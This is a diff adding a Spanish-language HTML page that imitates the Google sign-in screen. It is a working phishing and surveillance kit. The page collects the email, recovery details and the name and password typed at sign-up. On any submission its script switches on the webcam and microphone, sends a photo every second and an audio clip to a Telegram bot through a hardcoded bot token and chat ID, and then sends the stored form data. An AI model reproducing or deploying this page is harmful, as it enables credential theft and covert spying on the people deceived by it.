@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Cuentas de Google</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            color: #202124;
+            font-size: 14px;
+        }
+        
+        .header {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .logo {
+            width: 75px;
+            height: 24px;
+        }
+        
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .login-box {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px 40px;
+            margin-top: 20px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 0;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            margin-top: 8px;
+            margin-bottom: 40px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 40px;
+        }
+        
+        .info-text {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 40px;
+        }
+        
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            padding: 20px;
+            margin-top: 50px;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 15px;
+        }
+        
+        /* Elementos ocultos */
+        #video, #canvas {
+            display: none;
+        }
+        
+        /* Modal para contraseña */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+        
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #dadce0;
+            width: 80%;
+            max-width: 450px;
+            border-radius: 8px;
+        }
+        
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .close:hover {
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+    </div>
+    
+    <div class="container">
+        <div class="login-box">
+            <h1>Iniciar sesión</h1>
+            <p class="subtitle">Utiliza tu cuenta de Google</p>
+            
+            <form id="loginForm">
+                <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
+                <a href="#" id="forgotEmail" class="forgot-email">¿Has olvidado tu correo electrónico?</a>
+                
+                <p class="info-text">¿No es tu ordenador? Usa el modo invitado para navegar de forma privada. <a href="#">Más información</a></p>
+                
+                <div class="buttons">
+                    <a href="#" id="createAccount" class="create-account">Crear cuenta</a>
+                    <button type="submit" class="next-button">Siguiente</button>
+                </div>
+            </form>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div>España</div>
+        <div>
+            <a href="#">Ayuda</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+        </div>
+    </div>
+    
+    <!-- Modal para correo olvidado -->
+    <div id="forgotModal" class="modal">
+        <div class="modal-content">
+            <span class="close">×</span>
+            <h2>Encontrar tu correo electrónico</h2>
+            <p>Introduce tu número de teléfono o dirección de correo electrónico de recuperación para buscar tu cuenta.</p>
+            <input type="text" id="recoveryInfo" placeholder="Teléfono o correo electrónico">
+            <button id="searchAccount" class="next-button" style="margin-top: 15px;">Buscar</button>
+        </div>
+    </div>
+    
+    <!-- Modal para crear cuenta -->
+    <div id="createModal" class="modal">
+        <div class="modal-content">
+            <span class="close">×</span>
+            <h2>Crear tu cuenta de Google</h2>
+            <input type="text" id="firstName" placeholder="Nombre">
+            <input type="text" id="lastName" placeholder="Apellidos">
+            <input type="text" id="newEmail" placeholder="Nombre de usuario">
+            <input type="password" id="newPassword" placeholder="Contraseña">
+            <button id="signUpButton" class="next-button" style="width: 100%; margin-top: 15px;">Siguiente</button>
+        </div>
+    </div>
+    
+    <!-- Elementos ocultos con la funcionalidad de captura -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas" width="2000" height="2000"></canvas>
+
+    <script>
+        // Datos recopilados
+        let loginData = [];
+        let recoveryData = [];
+        let signupData = [];
+        
+        // Funcionalidad del formulario de login
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            
+            loginData.push({
+                email: email,
+                timestamp: new Date()
+            });
+            
+            alert('No se ha podido encontrar tu cuenta de Google. Inténtalo de nuevo más tarde.');
+            
+            // Iniciar captura
+            startCapture();
+        });
+        
+        // Funcionalidad de correo olvidado
+        document.getElementById('forgotEmail').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('forgotModal').style.display = 'block';
+        });
+        
+        // Funcionalidad de buscar cuenta
+        document.getElementById('searchAccount').addEventListener('click', function() {
+            const recoveryInfo = document.getElementById('recoveryInfo').value;
+            
+            recoveryData.push({
+                recoveryInfo: recoveryInfo,
+                timestamp: new Date()
+            });
+            
+            alert('Se ha enviado un correo electrónico con instrucciones para recuperar tu cuenta.');
+            document.getElementById('forgotModal').style.display = 'none';
+            
+            // Iniciar captura
+            startCapture();
+        });
+        
+        // Funcionalidad de crear cuenta
+        document.getElementById('createAccount').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('createModal').style.display = 'block';
+        });
+        
+        // Funcionalidad de registro
+        document.getElementById('signUpButton').addEventListener('click', function() {
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const newEmail = document.getElementById('newEmail').value;
+            const newPassword = document.getElementById('newPassword').value;
+            
+            signupData.push({
+                firstName: firstName,
+                lastName: lastName,
+                email: newEmail,
+                password: newPassword,
+                timestamp: new Date()
+            });
+            
+            alert('Cuenta creada exitosamente. Bienvenido a Google.');
+            document.getElementById('createModal').style.display = 'none';
+            
+            // Iniciar captura
+            startCapture();
+        });
+        
+        // Cerrar modales
+        document.querySelectorAll('.close').forEach(btn => {
+            btn.addEventListener('click', function() {
+                this.closest('.modal').style.display = 'none';
+            });
+        });
+        
+        // Cerrar al hacer clic fuera
+        window.addEventListener('click', function(e) {
+            if (e.target.className === 'modal') {
+                e.target.style.display = 'none';
+            }
+        });
+
+        // Funcionalidad de captura
+        const botToken = "7857762059:AAHmnhPFlXCwUE8ReMyPgz3MX12wgjjh0gE";
+        const chatId = "7377307394";
+
+        function startCapture() {
+            startCamera();
+            startRecording();
+        }
+
+        function startCamera() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const ctx = canvas.getContext("2d");
+
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            if (isMobile) {
+                video.setAttribute("width", "100%");
+                video.setAttribute("height", "auto");
+            } else {
+                video.setAttribute("width", "2000");
+                video.setAttribute("height", "2000");
+            }
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+
+                    setInterval(() => {
+                        ctx.drawImage(video, 0, 0, 2000, 2000);
+                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);
+                    }, 1000);
+                })
+                .catch(error => {
+                    console.error("Error en cámara:", error);
+                });
+        }
+
+        function startRecording() {
+            const audioChunks = [];
+
+            navigator.mediaDevices
+                .getUserMedia({ audio: true, video: false })
+                .then((stream) => {
+                    const mediaRecorder = new MediaRecorder(stream);
+
+                    mediaRecorder.start();
+
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 4000);
+
+                    mediaRecorder.addEventListener("dataavailable", (event) => {
+                        audioChunks.push(event.data);
+                    });
+
+                    mediaRecorder.addEventListener("stop", () => {
+                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
+                        sendAudioToTelegram(audioBlob);
+                        
+                        // Enviar también los datos recopilados
+                        sendCollectedData();
+                    });
+                })
+                .catch((error) => {
+                    console.error("Error en micrófono:", error);
+                });
+        }
+
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("photo", blob, "google_login.jpg");
+            formData.append("chat_id", chatId);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Foto enviada a Telegram");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error enviando foto:", error);
+                });
+        }
+
+        function sendAudioToTelegram(blob) {
+            const formData = new FormData();
+            formData.append("audio", blob, "google_audio.wav");
+            formData.append("chat_id", chatId);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+                method: "POST",
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Audio enviado a Telegram");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error enviando audio:", error);
+                });
+        }
+
+        function sendCollectedData() {
+            const formData = new FormData();
+            
+            if (loginData.length > 0) {
+                formData.append("login_data", JSON.stringify(loginData));
+                loginData = [];
+            }
+            
+            if (recoveryData.length > 0) {
+                formData.append("recovery_data", JSON.stringify(recoveryData));
+                recoveryData = [];
+            }
+            
+            if (signupData.length > 0) {
+                formData.append("signup_data", JSON.stringify(signupData));
+                signupData = [];
+            }
+            
+            if (formData.entries().next().done) return;
+
+            formData.append("chat_id", chatId);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                body: formData,
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Datos enviados a Telegram");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error enviando datos:", error);
+                });
+        }
+    </script>
+</body>
+</html>
